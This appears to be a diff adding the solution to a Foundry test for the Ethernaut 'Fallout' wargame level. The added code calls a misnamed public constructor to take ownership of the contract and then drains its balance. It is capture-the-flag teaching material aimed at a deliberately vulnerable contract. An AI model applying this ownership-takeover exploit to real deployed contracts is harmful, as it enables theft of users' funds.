@@ -34,5 +34,20 @@ contract FallbackTest is DSTest {
         //--------------------------------------------------------------------------------
         //                             Start Level Attack
         //--------------------------------------------------------------------------------
+
+        falloutContract.Fal1out{value: 1 wei}();
+        assertEq(falloutContract.owner(), attacker);
+
+        falloutContract.collectAllocations();
+        assertEq(address(falloutContract).balance, 0);
+
+        //--------------------------------------------------------------------------------
+        //                                Submit Level
+        //--------------------------------------------------------------------------------
+        bool challengeCompleted = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
+        vm.stopPrank();
+        assert(challengeCompleted);
     }
 }
